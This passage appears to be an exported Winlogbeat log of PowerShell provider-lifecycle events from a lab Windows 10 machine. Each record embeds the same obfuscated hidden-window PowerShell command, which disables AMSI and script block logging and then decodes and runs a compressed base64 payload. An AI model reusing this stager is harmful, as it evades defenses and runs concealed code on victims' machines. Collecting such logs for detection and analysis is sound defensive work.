	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6173,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.136",AnkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6174,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.136",A3kLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { 